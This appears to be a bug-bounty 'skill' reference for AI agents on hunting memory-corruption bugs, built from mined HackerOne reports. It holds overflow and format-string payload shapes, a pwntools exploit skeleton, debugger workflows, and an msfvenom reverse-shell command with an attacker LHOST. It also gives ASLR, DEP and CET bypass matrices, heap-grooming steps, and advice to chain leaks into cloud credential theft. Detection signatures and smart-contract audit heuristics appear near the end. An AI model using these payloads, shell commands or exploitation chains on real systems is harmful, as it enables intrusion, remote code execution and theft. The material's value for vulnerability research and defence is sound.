huge_name_cookie[8480,9504) / huge_name[9632,10144) adjacent buffers (#3340109)
```

### Buffer-overflow / off-by-one payload shapes

```text
# Classic stack overflow — overwrite saved EIP with recognizable pattern
STOR /AAAAAAAA…[420 bytes]…     # CVE-2025-0910-style strcpy path
Expected debugger result: EIP = 0x61616161  (#550625)

# Off-by-one — exact boundary
path length 1023 → OK; path length 1024 → strcpy writes 1025 incl. NUL (#3427343)
byte_count = strlen(req->path) + 1; if (byte_count > sizeof(buf)) → wrong operator

# Fixed-base64 decode buffer overflow
Authorization: Basic <base64 that decodes to 43011 bytes into char decodedAuthToken[8192]>
gdb> p decodedLen → 43011; decodedAuthToken[decodedLen] = '\0' (#641240)

# Integer-overflow-driven oversized allocation
CURLOPT_POSTFIELDSIZE_LARGE = 0x7FFFFFFFFFFFFFFF → CURLE_OUT_OF_MEMORY / ASan abort (#3417428)
```

### Underflow / null-deref / type-confusion triggers

```text
# Single-byte OOB WRITE from underflow (php-fpm, CVE-2019-11043)
FastCGI PATH_INFO set to empty → path_info pointer underflow → 1-byte OOB write → RCE (#722327)

# OOB READ before bounds check (RSA modulus)
certificate BIT STRING content: 00 30 02 02 00
  00 = unused bits; 30 02 = SEQUENCE len 2; 02 00 = INTEGER len 0 (zero modulus)
→ 1-byte OOB heap read in do_pubkey() on non-OpenSSL TLS backend (#3617719)

# NULL pointer dereference
CURLU_DEFAULT_SCHEME + redirect_url() on URL API handle with no scheme (#3736234)
Server certificate with malformed DN → encodeDN() NULL deref during TLS connect (#2559558)

# Type confusion in script engine
Range = Array; (1..2).inspect          → RRange struct interpreted as Array (#181910)
NoMethodError.define_singleton_method(:new) { "waat" }; Object.q  → mrb_no_method_error (#181871)
GMP unserialize payload: a:1:{i:0;C:3:"GMP":<len>:{s:1:"1";a:3:{…R:2…}}}  (#198734)
```

### UAF / double-free lifecycle probes

```text
# Double-init leaves dangling reference
MRubyEngine initialized twice → engine freed + mspace unmapped; stale mrb_state used → RCE (#3679660)
COM object double-init, worker thread forces early uninit → UAF (#119657)

# Reentrant callback mutates live list
export callback re-enters curl_easy_ssls_import() on same easy handle (#3682666)
addsocket callback locks mutex in base during curl shutdown (#3580247)

# Race on shared object
two Flash workers both call bytearray.clear() → double free (#37240)
one worker compress() while other uses bytearray → double free (#47227)
url_move_hostname() frees host without lock while url_match_destination() reads it (#3638715)

# WinDbg UAF triage (from exploit-dev reference)
!heap -s
uf <crashed_function>
dd rcx
dt _DPH_BLOCK_INFORMATION rcx-20
!heap -p -a rcx      # call stack of the FREE
```

### pwntools skeleton for turning a primitive into control

```python
from pwn import *
context.arch = 'amd64'
# 1. leak: trigger the OOB read, capture bytes to derandomize ASLR
# 2. groom: allocate objects of the freed size class to reclaim the UAF slot
# 3. overwrite: write fake vtable / function pointer with system address
# 4. trigger: invoke the virtual method on the reclaimed object
p = process('./vuln_target')
p.sendline(b'A' * OFFSET + p64(FAKE_VTABLE))
p.interactive()
```

### Source-review grep recap

```bash
grep -rE "strcpy|sprintf|memcpy|char .*\[[0-9]{3,}\]" src/
grep -rE "unserialize|C:3:\"GMP\"|__wakeup" .
grep -rE "free\(|decref|refcount" src/ | grep -i callback
```

### Debugger Commands for Primitive Confirmation

```bash
# gdb / pwndbg — confirm an OOB write and find the faulting instruction
gdb -q ./target_asan ./min.bin
(gdb) run
(gdb) bt full                 # identify the named vulnerable function
(gdb) x/16gx $rsp             # inspect saved return address / adjacent buffers
(gdb) info registers          # check if a register holds attacker bytes (0x61616161)
(gdb) find $rsp, $rsp+0x400, 0x61616161    # locate the pattern on the stack

# pwndbg helpers
pwndbg> cyclic 420            # generate a non-repeating pattern
pwndbg> cyclic_find(0x61616161)   # compute the exact EIP offset
pwndbg> heapinfo               # inspect glibc chunks after a heap overflow
pwndbg> bins                  # tcache / fastbin / unsorted bin state

# WinDbg — UAF triage (from the exploit-development reference)
!heap -s
uf <crashed_function>
dd rcx
dt _DPH_BLOCK_INFORMATION rcx-20
!heap -p -a rcx               # shows the call stack that FREED the object
```

### Format-String Write Primitive (when the format string is attacker-influenced)

```text
# Leak stage — derandomize ASLR before any write
EHLO %43$p|%45$s              → leaks libc / GOT contents (#181871-style input surface)
# Write stage — overwrite a hook with system()
%<offset>$n  → write to __free_hook / __malloc_hook, then trigger free()
# Detect the bug class in source:
syslog(user_controlled_string)        # vulnerable — MailManD-style case in exploit-dev ref
vsnprintf(dest, size, user_fmt, ...)  # check who controls `user_fmt`
```

### Bad Characters & Shellcode Constraints

```text
Typical excluded bytes: 0x00 (NUL), 0x0A, 0x0D (newlines in text protocols),
and any byte consumed by the parser (e.g. 0x2F '/' in a path, 0x3B ';' in headers).
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 \
  EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
Prepend NOPs for the decoder's getPC stub:
  attackBuffer = filler + eip/offset + NOPs + shellcode
x86-64 with IBT/CET: place ENDBR64 (F3 0F 1E FA) at indirect entry points.
```

### Detection Signatures for Defenders

```text
Stack canary mismatch / __stack_chk_fail       → stack overflow attempt
ASan "heap-use-after-free" in request path     → lifetime bug (#3355213, #3638715)
Repeated SIGSEGV with EIP = ASCII pattern      → active exploitation, not random crash (#550625)
Oversized Authorization/Host header            → pre-auth overflow attempt (#641240, #778610)
Malformed BIT STRING 00 30 02 02 00 in cert    → do_pubkey OOB read probe (#3617719)
HTTP/2 GOAWAY + pseudo-header anomalies        → uninitialized-read DoS attempt (#335533, #3434510)
```

---

## Common Root Causes

1. **Missing upper/lower bounds check** — the dominant class. `#807772`: "the lower bounds of the entity index [are] checked but not the upper bounds." `#3617719` dereferences before the length check. Fix: validate both ends before indexing.
2. **Off-by-one comparison** — `>` where `>=` is required (`#3427343`) lets a null terminator spill one byte past a 1024-byte buffer.
3. **Unvalidated decoded/expanded length** — base64 decode into a fixed stack buffer (`#641240`), 2× character expansion into a 387-byte `quote_name()` buffer (`#3788482`), unbounded decompression chain "malloc bomb" (`#1614330`).
4. **Integer underflow / truncation** — empty `PATH_INFO` underflow (`#722327`), `cut_max_length` underflow → heap disclosure (`#3771139`), 64→32-bit casts and sign mismatches in path length arithmetic (`#3804525`, `#547630`).
5. **Lifetime / refcount errors** — double-init (`#3679660`), early uninit in a worker (`#119657`), reentrant export callback mutating a live list (`#3682666`), frees without locking in a shared pool (`#3638715`), shutdown callback locking a freed base (`#3580247`).
6. **Type confusion / invalid cast** — objects interpreted as a different class: GMP deserialization (`#198734`), redefined `Range` constant (`#181910`), `NoMethodError.new` override (`#181871`), IPv4-mapped IPv6 conversion (`#2493548`), Best-Fit hostname mapping (`#2552179`), GraphQL unhandled type exception (`#996041`).
7. **Missing null checks on optional state** — URL API `redirect_url()` with default scheme (`#3736234`), `encodeDN()` on malformed certificate (`#2559558`), WDDX/PDORow deserialization (`#180908`).
8. **Use after free via callback re-entry** — the callback frees or mutates the object whose iteration is in progress (`#181321`: array shrunk during `to_ary`; `#3682666`).
9. **Missing size checks on upload** — `#19532`: "there isn't any 'size check' when someone tries to upload a flie … bigger and bigger files," leading to memory leak/overflow.
10. **Protocol state machine errors** — malformed HTTP/2 frames cause uninitialized read (`#335533`); RST_STREAM mid-upload frees `struct Curl_easy` still in use (`#4030333`).

### Root-Cause → Test Matrix

| Root cause | Single fastest test | Confirming signal |
|---|---|---|
| Missing bounds check | index = 0, index = max, index = max+1 | ASan OOB read/write at the indexed line |
| Off-by-one | input length exactly N and N+1 | 1-byte write past the buffer (`#3427343`) |
| Unvalidated decode length | base64 that decodes >> buffer size | `decodedLen` larger than static array (`#641240`) |
| Integer underflow | empty / zero-length field | negative pointer or huge length (`#722327`, `#3771139`) |
| Lifetime / refcount | double-init, concurrent clear, reentrant callback | ASan UAF with a FREE stack (`#3679660`, `#37240`) |
| Type confusion | redefine a constant/type, self-referential object | segfault on an invalid cast (`#181910`, `#198734`) |
| Missing null check | omit scheme / malformed certificate | SEGV in `redirect_url()` / `encodeDN()` |
| Resource exhaustion | unbounded decompression chain / header count | RSS growth then OOM (`#1614330`, `#2552192`) |

### Why These Recur

- The same library is vendored into many products — one libcurl bug becomes hundreds of downstream findings (`#2871792`, `#3340109`, `#3462525`, `#3427343`).
- "Trusted" inputs (server responses, certificate fields, file metadata) are parsed with the same unsafe code as obviously attacker-controlled input (`#3788482`, `#3617719`).
- Fixes are often incomplete or version-specific — `#4118643` is explicitly a "fix incomplete" follow-up to a prior CVE.
- Error paths and teardown paths get less testing than happy paths, which is why frees, callbacks, and shutdown dominate the UAF reports (`#3682666`, `#3580247`, `#4030333`).

---

## Bypass Techniques

### Exploit-mitigation bypass matrix (from exploit-development reference)

| Mitigation | Protects | Bypass primitive | Corpus anchor |
|---|---|---|---|
| DEP / NX | Code in data pages | ROP/JOP pivot to RWX or change page perms | `#181879` jumps to controlled address; `#684573` kernel ROP |
| ASLR | Base-address disclosure | Info leak via OOB read, then partial overwrite | `#807772`, `#187134` |
| CFG / CET / XFG | Indirect-call / return integrity | JOP, fake vtable inside allowed target, RWX JIT/WASM page | mruby fake-vtable UAF `#3679660` |
| Stack canaries / SafeSEH / SEHOP | EIP overwrite | Overwrite SEH then pop-pop-ret (where disabled); prefer non-return ROP-less pivots | `#550625` direct EIP overwrite |
| Heap hardening (safe-linking, tcache) | Overlapping chunks | tcache-stashing-unlink / House of Kiwi, byte-wise brute of lower bits | `#3324190`, `#3638715` |
| MTE / PAC (ARM) | Spatial/temporal safety | Tag brute-force / speculative TikTag leak; JOP with AUTIA gadgets | modern mobile targets |
| Input filters / MIME checks | Which parser is reached | MIME swap, corrupted bytes after the check, Best-Fit/Unicode mapping | `#996041`, `#2552179` |

### Parser / filter bypasses seen in the corpus

- **MIME/content-type swap** — pass the filter with `image/png`, then flip to `image/svg+xml` and corrupt the body (`#996041`).
- **Unicode Best-Fit mapping** — GBK code page maps `0xb9 → '1'`, `0xb2 → '2'`; build a hostname that resolves to a different destination after conversion (`#2552179`, `#2493548`).
- **Alternate TLS backend** — the OOB read in `do_pubkey()` only triggers on non-OpenSSL backends (mbedTLS/GnuTLS/Rustls/Schannel); GnuTLS-specific out-of-bounds in `gtls_send()` (`#4099194`). Know which build the target uses.
- **Boundary/case tricks** — empty or zero-length values, `>` vs `>=`, extra terminator, negative index.
- **Validation vs use mismatch** — type is validated at the gate but a later conversion reinterprets it (`#2552179`); length is checked before decoding, but decoding expands (`#641240`, `#3788482`).
- **Reentrancy as bypass** — filters assume single-entry; a callback re-enters with a different state (`#3682666`).

### Heap-grooming notes

- For UAF: free the target object, then spray same-size allocations (JSArray backing stores, string buffers) to reclaim the slot and install a fake vtable → arbitrary R/W → `VirtualProtect`/`mprotect` → shellcode. This mirrors the Edge WebView2 UAF pattern in the exploit-dev reference and fits `#3679660`, `#3355213`.
- For heap overflow: corrupt the size/`fd` of the next chunk to force an overlapping allocation; on glibc 2.41+ use tcache-stashing-unlink rather than fastbin-dupes.
- On Windows Segment Heap / LFH, expect different front-end grooming; use PageHeap + Application Verifier to triage (`!heap -p -a <addr>`).

### ASLR & Info-Leak Bypass in Detail

1. **Find the read primitive first.** OOB reads are the most common source: `#807772` leaks entity-table memory; `#4099194` reads past curl's WebSocket send buffer; `#3324190` overreads a heap buffer. `#187134` explicitly reasons about "recovering the internal memory layout remotely which could assist in circumventing ASLR."
2. **Derandomize a module base.** Leak a pointer, subtract the known offset from your local build, and compute the runtime base. Confirm with two independent leaks.
3. **Use partial overwrites when a full pointer is unavailable.** Overwriting only the low 2–3 bytes of a saved return address or function pointer often suffices and evades bad-character restrictions.
4. **Chain to a write.** Combine the leak with a fake vtable (UAF, `#3679660`) or an overlapping chunk (heap overflow, `#3324190`) to reach arbitrary R/W.
5. **Respect the sandbox.** Browser/JIT targets add CFG/CET/XFG and possibly a V8-style sandbox; prefer JOP gadgets or existing RWX (JIT/WASM) regions over fresh `mprotect`/`VirtualProtect` calls.

### When the Bug Is Only a DoS

- Still report it when it is unauthenticated and process-wide: `#335533` crashes the whole Node.js instance via a malformed frame; `#1614330` ($2,400) is a documented malloc-bomb DoS.
- Quantify the cost: one request vs. sustained traffic, single process vs. fleet, automatic restart vs. manual recovery.
- Look harder for a stronger primitive before finalizing — many DoS reports in this corpus are memory-safety bugs that the reporter stopped investigating too early (`#477344`, `#245221`).

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Is there a demonstrated write primitive, EIP/RIP control, arbitrary R/W, or reliable memory disclosure — not just a hang?
   - Show the sanitizer trace, the overwritten EIP (`0x61616161` in `#550625`), the leaked bytes, or the IPC/control-flow hijack (`#181879`).
   - A bare "it segfaults" is insufficient. Quantify the primitive: 1-byte OOB write vs. controlled-length heap write are different findings.

2. **What does the victim LOSE?**
   - Remote code execution on client (`#550625`, `#3788482`) or server (`#778610`, `#722327`)?
   - Kernel privilege escalation from unprivileged user (`#684573`, `#347282`)?
   - Memory/secret disclosure (`#3771139`, `#4099194`, `#807772` info leak → RCE)?
   - Cross-tenant impact / sandbox escape (`#181879` from sandboxed mruby)?
   - If the only outcome is a local process crash with no attacker benefit, rate it as DoS and say so.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is there a minimized PoC with exact version, compiler flags, and sanitizer settings?
   - Does the crash reproduce ≥90% of runs (races need TSan evidence and repeated runs)?
   - Can a second person run the harness and get the same ASan report?
   - If reproduction depends on a rare race or a specific backend, document the dependency explicitly (`#3617719` needs non-OpenSSL TLS; `#4099194` needs GnuTLS + multi-MB upload).

### Negative Controls to Run Before Submitting

- **Well-formed input** — the same harness with a valid file/frame/object must not crash. This proves the malformed field is causal.
- **Unpatched vs patched build** — if a fix is public, confirm the PoC fails on the fixed version; this validates root cause.
- **Non-attacker-controlled path** — show that the same sink with a benign source does not reach the vulnerable line.
- **Backend toggles** — confirm which TLS backend / compile-time option is active (`#3617719`, `#4099194`, `#3493602`).
- **Race controls** — for UAF/double-free races, run with TSan and without the concurrency trigger; the corruption should disappear (`#3638715`, `#37240`).

### Report Submission Checklist

- [ ] Title names the subclass and the affected function (e.g., "Off-by-one in `smb_send_open()`").
- [ ] Affected version/commit and build flags are stated.
- [ ] Full ASan/UBSan/TSan trace with stack is attached.
- [ ] Minimized reproducer is included and deterministic (≥90% of runs).
- [ ] Attacker benefit is explicit: RCE / LPE / disclosure / DoS, with the trust boundary named.
- [ ] Reachability from the real product is demonstrated, not only the harness.
- [ ] Every CVE, report ID, and URL in the write-up has been verified.
- [ ] Severity accounts for preconditions and matches the corpus's honesty standard (`#4099194` self-rated Low).

---

## Real Impact Examples

### Scenario A: Client-side RCE via a malicious game asset (Valve pattern — #550625, #351014, #505173, #807772)
An attacker hosts a game server with a custom map. When a victim connects, the map and its resources are downloaded and parsed automatically. A texture with an excessively long filename and `TEXTUREFLAGS_DEPTHRENDERTARGET` set overflows a fixed stack buffer in `hw.dll`; the saved return address is overwritten with `0x61616161`. A crafted `.BSP` or detail-texture file produces an access violation leading to arbitrary code execution. Separately, network message handlers check only the *lower* bound of an entity index, so negative-free but oversized indices read out of bounds — and because these reads leak memory contents, they are a stepping stone to defeating ASLR and achieving RCE (`#807772`, $7,500). Impact: full compromise of every victim who connects to the malicious server.

### Scenario B: Pre-auth server RCE through a protocol parser (#778610, #641240, #722327)
A Squid reverse proxy parses the attacker-controlled `Host` header into a fixed stack buffer; a long header overflows it and yields RCE and data leak (`#778610`). In the same product, `HttpHeader::getAuth` base64-decodes a `Basic` credential into `static char decodedAuthToken[8192]` without checking decoded size — `decodedLen` reaches 43011 — giving a heap overflow reachable over FTP "even when basic auth isn't configured" (`#641240`). In php-fpm, an empty `PATH_INFO` triggers a pointer underflow and a single-byte OOB write; in certain Nginx configurations an attacker who controls request headers can reach it and get code execution (`#722327`, CVE-2019-11043). Impact: unauthenticated remote code execution on internet-facing infrastructure.

### Scenario C: Sandbox escape / host RCE via type confusion in an embedded script engine (#181879, #181910, #181321, #3679660)
In the shopify-scripts mruby sandbox, researchers redefined the `Range` constant to `Array`, causing `RRange` struct data to be interpreted as an incompatible object and segfaulting the process (`#181910`, $10,000). Overriding `NoMethodError.new` caused memory corruption in `mrb_no_method_error` (`#181871`). A struct type confusion gave control of the instruction pointer and a straightforward path to arbitrary read/write and full RCE (`#181879`, $18,000). A UAF in `MRubyEngine#initialize` from double initialization enabled local RCE via a fake state and `system()` call (`#3679660`). Impact: a "sandboxed" script escapes to host-level code execution.

### Scenario D: Memory disclosure, DoS, and cross-primitive chains (#3771139, #4099194, #335533, #2493548)
An integer underflow in MariaDB's `Item_func_json_arrayagg::cut_max_length` discloses heap memory to a client (`#3771139`); a GnuTLS-specific OOB read in `gtls_send()` lets a malicious WebSocket server pull memory past curl's send buffer (`#4099194`); malformed HTTP/2 frames cause an uninitialized read that segfaults the entire Node.js instance (`#335533`). A type confusion in curl's IPv4-mapped-IPv6 handling turns a parser bug into indeterminate SSRF/RFI/LFI against downstream programs (`#2493548`). Impact: confidential data leakage, process-wide denial of service, and pivot into SSRF — demonstrating that "just a read" or "just a crash" can still be high-value when chained.

### Scenario E: Unprivileged-to-kernel and double-free LPE (#684573, #684567, #347282)
A Linux kernel bug caused by a UFO-to-non-UFO path switch lets an unprivileged process gain kernel code execution (`#684573`); a signedness issue in AF_PACKET sockets provides a related primitive (`#684567`); and CVE-2017-6074 is a kernel double free (`#347282`). In each case the reporter supplied a working privilege-escalation PoC rather than only a crash, which is what elevates a kernel memory-corruption report from interesting to critical. Impact: root from an unprivileged account, defeat of all user-mode isolation.

### Cross-Cutting Lessons From the Impact Examples

- **The strongest reports pair a primitive with a trust boundary.** Sandbox→host, client→server, guest→kernel, user→other tenant.
- **A crash is the beginning, not the end.** Every high-value example here continued to EIP control, arbitrary R/W, or a data leak.
- **Attack surface matters as much as bug class.** The same overflow is critical pre-auth (`#778610`) and lower severity when it needs local setup (`#4099194`).
- **Chains multiply impact.** Type confusion → SSRF (`#2493548`), OOB read → ASLR defeat → RCE (`#807772`), memory corruption → kernel LPE (`#684573`).

---

## Disclosed Report Citations

All IDs below are real and present in the study pack. Years and bounties are as recorded in the mining corpus; "—" means not disclosed, "n/d" means not stated in the corpus.

1. **Valve — OOB reads in network message handlers leads to RCE** ([H1 #807772](https://hackerone.com/reports/807772)) — Out-of-bounds Read, public-code-search / image-processing, 2020 / $7,500
2. **Valve — Malformed .BSP Access Violation in CS:GO can lead to Remote Code Execution** ([H1 #351014](https://hackerone.com/reports/351014)) — Classic Buffer Overflow, malformed map file, 2018 / —
3. **Valve — Unchecked texture file name with TEXTUREFLAGS_DEPTHRENDERTARGET can lead to Remote Code Execution** ([H1 #550625](https://hackerone.com/reports/550625)) — Stack Overflow, server-side-rendering / debug-error-leak, 2019 / $2,500
4. **Valve — Malformed map detailed texture files in GoldSrc games lead to Remote Code Execution** ([H1 #505173](https://hackerone.com/reports/505173)) — Stack Overflow, public-code-search / filter-bypass, 2019 / $350
5. **shopify-scripts — Struct type confusion RCE** ([H1 #181879](https://hackerone.com/reports/181879)) — Type Confusion → RCE, public-code-search, 2016 / $18,000
6. **shopify-scripts — Range constructor type confusion DoS** ([H1 #181910](https://hackerone.com/reports/181910)) — Type Confusion, dos-resource, 2016 / $10,000
7. **shopify-scripts — Use after free vulnerability in mruby Array#to_h causing DOS possible RCE** ([H1 #181321](https://hackerone.com/reports/181321)) — Use-after-free, public-code-search / search-filter-sort, 2016 / —
8. **shopify-scripts — DoS: type confusion in mrb_no_method_error** ([H1 #181871](https://hackerone.com/reports/181871)) — Type Confusion, dos-resource, 2016 / —
9. **Internet Bug Bounty — GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE]** ([H1 #198734](https://hackerone.com/reports/198734)) — Type Confusion, deserialization / template-engine, 2017 / —
10. **Reddit — Image queue default key of 'None' and GraphQL unhandled type exception** ([H1 #996041](https://hackerone.com/reports/996041)) — Type Confusion, image-processing / file-upload / debug-error-leak, 2020 / $500
11. **curl — Function `do_pubkey()` can have out-of-bound read issue** ([H1 #3617719](https://hackerone.com/reports/3617719)) — Out-of-bounds Read, port-scanning / dos-resource, 2026 / —
12. **curl — Curl parse_connect_to_string Heap-Overread Leading to Denial of Service via CURLOPT_CONNECT_TO** ([H1 #3306456](https://hackerone.com/reports/3306456)) — Buffer Over-read, debug-error-leak / dos-resource, 2025 / —
13. **curl — Use-After-Free race condition in url_move_hostname() via shared connection pool** ([H1 #3638715](https://hackerone.com/reports/3638715)) — Use-after-free, api-endpoint / race-condition, 2026 / —
14. **curl — Stack Buffer Overflow in cURL Cookie Parsing Leads to RCE** ([H1 #3340109](https://hackerone.com/reports/3340109)) — Stack Overflow, cookie-handling / dos-resource, 2025 / —
15. **curl — Buffer Overflow Vulnerability in strcpy() Leading to Remote Code Execution** ([H1 #2871792](https://hackerone.com/reports/2871792)) — Classic Buffer Overflow, public-code-search / path-traversal-lfi, 2024 / —
16. **curl — Incorrect Type Conversion in interpreting IPv4-mapped IPv6 addresses … results in indeterminate SSRF vulnerabilities** ([H1 #2493548](https://hackerone.com/reports/2493548)) — Type Confusion → SSRF, public-code-search / filter-bypass, 2024 / —
17. **curl — Off-by-One Buffer Overflow in SMB Path Handler** ([H1 #3427343](https://hackerone.com/reports/3427343)) — Off-by-one / Buffer Overflow, debug-error-leak, 2025 / —
18. **curl — libcurl MQTT CURLOPT_POSTFIELDSIZE_LARGE overflow leads to immediate DoS** ([H1 #3417428](https://hackerone.com/reports/3417428)) — Integer Overflow, dos-resource, 2025 / —
19. **curl — Buffer Overflow in cURL Internal printf Function** ([H1 #3462525](https://hackerone.com/reports/3462525)) — Stack Overflow, format-string / debug-error-leak, 2025 / —
20. **curl — CVE-2026-92392: HTTP/2 upload Use-After-Free** ([H1 #4030333](https://hackerone.com/reports/4030333)) — Use-after-free, blind-oob / dos-resource, 2026 / —
21. **curl — NULL pointer dereference in libcurl URL API redirect_url() with CURLU_DEFAULT_SCHEME** ([H1 #3736234](https://hackerone.com/reports/3736234)) — NULL deref, search-filter-sort / redirect-handling, n/d / —
22. **curl — NULL-dereference in encodeDN() when parsing the certificate of a server during the TLS connect-phase** ([H1 #2559558](https://hackerone.com/reports/2559558)) — NULL deref, certificate parsing, n/d / —
23. **MariaDB — Stack Buffer Overflow in mariadb-dump quote_name() Allows Malicious Server to Execute Arbitrary Code on Client** ([H1 #3788482](https://hackerone.com/reports/3788482)) — Stack Overflow, path-traversal-lfi / client-file, n/d / —
24. **MariaDB — Stack Buffer Overflow via Crafted keyseg->start / keyseg->length in .MYI File (MariaDB MyISAM)** ([H1 #3771147](https://hackerone.com/reports/3771147)) — Stack Overflow, import-feature / filter-bypass, n/d / —
25. **MariaDB — Heap Memory Disclosure via Integer Underflow in Item_func_json_arrayagg::cut_max_length** ([H1 #3771139](https://hackerone.com/reports/3771139)) — Integer Underflow, cache-layer / session-attack, n/d / —
26. **Perl / XML::LibXML — Use-after-free in XML::LibXML::Node::replaceChild** ([H1 #259390](https://hackerone.com/reports/259390)) — Use-after-free, xml-parser, 2017 / —
27. **Linux kernel — CVE-2017-6074 double-free vulnerability** ([H1 #347282](https://hackerone.com/reports/347282)) — Double Free, kernel LPE, 2017 / —
28. **Linux kernel — CVE-2017-1000112: a memory corruption due to UFO to non-UFO path switch** ([H1 #684573](https://hackerone.com/reports/684573)) — Memory Corruption (OOB), public-code-search, 2019 / —
29. **Internet Bug Bounty — Basic Authentication Heap Overflow** ([H1 #641240](https://hackerone.com/reports/641240)) — Heap Overflow, base64-encoding / search-filter-sort, 2019 / —
30. **Internet Bug Bounty — CVE-2019-11043: a buffer underflow in fpm_main.c can lead to RCE in php-fpm** ([H1 #722327](https://hackerone.com/reports/722327)) — Buffer Underflow → 1-byte OOB write → RCE, public-code-search, 2019 / $1,500

---

## Related Skills & Chains

- **`offensive-exploit-development`** — Once a crash is classified, load this skill for heap feng-shui, fake-vtable UAF exploitation, tcache-stashing-unlink, ROP/JOP chains, and mitigation bypass (DEP/ASLR/CET/XFG/MTE). Provides the pwntools/pwndbg workflow and the "control achieved / reliability ≥80%" exit criteria used in Step 8.
- **`hunt-rce`** — Memory corruption is a primary RCE primitive. Chain: stack/heap overflow or type confusion → arbitrary R/W → W^X bypass → code execution (`#181879`, `#550625`, `#722327`).
- **`hunt-ssrf`** — Parser type confusions can redirect fetches. Chain: IPv4-mapped-IPv6 / Best-Fit hostname confusion → SSRF to metadata or internal services (`#2493548`, `#2552179`); apply the SSRF skill's OOB-or-it-didn't-happen gate for blind cases.
- **`hunt-dos` / resource-exhaustion hunting** — Many corpus reports are DoS-first (`dos-resource` 185): unbounded decompression (`#1614330`), header storage (`#2552192`), paused-transfer buffers (`#3734947`), 1xx streaming (`#3734020`). A DoS can be the triage entry point to a stronger memory-safety bug.
- **`fuzzing` / `security-arsenal`** — AFL++/libFuzzer + ASan/UBSan/TSan harnesses and seed corpora are the highest-yield discovery method in the corpus (`#477344`, `#245221`, `#269568`, `#344035`). Keep minimized crashing inputs as regression seeds.
- **`triage-validation`** — Apply Gate 0: demand a sanitizer trace, a minimized reproducer, and a quantified primitive before submission. Downgrade honestly when a bug needs a specific backend or a rare race (`#3617719`, `#4099194`, `#3638715`).
- **`cloud-iam-deep` / `hunt-cloud-misconfig`** — When a memory-safety bug yields memory disclosure or an SSRF pivot, chain into credential theft from cloud metadata or internal APIs (`#807772` info leak → RCE; `#2493548` type confusion → SSRF).


---

## Merged Source Knowledge

This section consolidates **7 unique knowledge blocks** from 3 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (7 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-1-arithmetic-operations/fv-anc-1-cl1-overflow-underflow-in-arithmetic-operations.md`

## TLDR

Integer overflow and underflow in Rust Anchor programs occur when arithmetic on u64/u128/i64 values wraps or panics, leading to corrupted balances, bypassed caps, or exploitable logic. In release builds, Rust integers wrap silently unless checked variants are used.

## Detection Heuristics

**Unchecked Arithmetic on Account Fields**
- Direct use of `+`, `-`, `*` operators on account field values such as `ctx.accounts.user.balance + amount`
- Arithmetic result assigned directly without `.checked_add()`, `.checked_sub()`, `.checked_mul()`, or `.checked_div()`
- Use of `as` casts (e.g., `u128 as u64`) that silently truncate

**Saturating or Wrapping Instead of Checked**
- Use of `.saturating_add()` or `.wrapping_add()` in financial or security-sensitive contexts where saturation masks real overflow
- Intermediate values computed in u64 that could exceed u64::MAX before being cast

**Absence of Error Propagation on Arithmetic**
- `.unwrap()` on checked arithmetic instead of `.ok_or(ErrorCode::...)` or `?`
- Arithmetic inside a loop over account balances without per-iteration overflow checks

## False Positives

- Arithmetic on values bounded by protocol invariants already enforced earlier in the instruction, making overflow mathematically impossible
- Use of `.saturating_add()` on non-financial counters such as event sequence numbers where saturation is the intended behavior
- Arithmetic inside `#[cfg(test)]` blocks that only appear in test code


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-1-arithmetic-operations/readme.md`

## Classifications

Run `cat $SKILL_DIR/reference/anchor/fv-anc-1-arithmetic-operations/<filename>` to read any case file listed below.


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-8-advanced-patterns/fv-mov-8-cl1-generic-type-confusion.md`

## TLDR

Unvalidated generic type parameters are the number-one critical vulnerability across real Move audits. An attacker creates a worthless `Coin<FakeUSDC>` and passes it to any function accepting `Coin<T>` without type validation, borrowing real assets against fake collateral. Phantom types on generic capabilities (`RoleCap<T>`) with no concrete type check enable role confusion.

## Detection Heuristics

- Find every function with a generic type parameter `<T>` that handles `Coin<T>`, `Balance<T>`, or any value-bearing type - verify `T` is validated against a stored type identifier or a whitelist
- Safe pattern: pool or vault struct uses `Pool<T>` - the phantom type on the container forces the function to only accept `Coin<T>` for the same `T`; verify this pattern is used consistently
- Search for `type_info::type_of::<T>()` comparisons - verify they compare against a stored expected type, not a hardcoded string that could be bypassed
- For role capabilities `RoleCap<T>` used in access control: verify the function asserts `T` is the expected concrete type, not just any type satisfying the constraint
- Navi Protocol and Econia are named examples - any lending or AMM function accepting generic coins without pool-level phantom type binding is high risk

## False Positives

- Pool/vault struct uses phantom type binding: `Pool<T>` forces all operations to use matching `Coin<T>`
- Explicit type registry: `assert!(type_info::type_of<T>() == stored_type)`
- Function is `public(package)` and only called by trusted internal code with statically verified types
